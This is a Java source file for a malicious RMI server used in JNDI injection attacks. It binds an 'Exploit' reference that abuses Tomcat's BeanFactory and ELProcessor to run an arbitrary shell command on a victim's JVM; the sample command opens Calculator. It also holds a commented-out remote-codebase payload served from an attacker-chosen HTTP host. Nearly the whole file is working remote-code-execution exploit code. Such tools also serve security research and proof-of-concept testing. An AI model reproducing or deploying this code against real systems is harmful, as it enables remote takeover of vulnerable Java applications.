import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;
import javax.el.ELProcessor;

public class HackerRMIRefServer {

    /***
     * 启动RMI服务
     *
     * @throws Exception
     */
    public static void lanuchRMIregister(Integer rmi_port, String callback_http_host, Integer http_port) throws Exception {

        System.out.println("Creating RMI Registry, RMI Port:"+rmi_port);
        Registry registry = LocateRegistry.createRegistry(rmi_port);

        String remote_class_server = "http://"+callback_http_host+":"+http_port.toString()+"/";
        System.out.println("HTTP URL CodeBase: "+remote_class_server);

        /** Payload1: Exploit JNDI Reference with remote factory **/
        // Reference ref = new Reference("Exploit", "Exploit", remote_class_server);
        /** Payload1 end **/


        /** Payload2: Exploit with JNDI Reference with local factory Class **/
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "K=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("K", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
        /** Payload2 end **/


        // Reference包装类
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());
    }

    public static void main(String[] args) throws Exception {

        System.out.println("HttpServerAddress: "+args[0]);
        System.out.println("HttpServerPort: "+args[1]);
        System.out.println("RMIServerPort: "+args[2]);
        Integer rmi_port = Integer.valueOf(args[2]);
        String http_server_ip = args[0];
        int http_server_port = Integer.valueOf(args[1]);

        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);
        lanuchRMIregister(rmi_port, http_server_ip, http_server_port);
    }
}
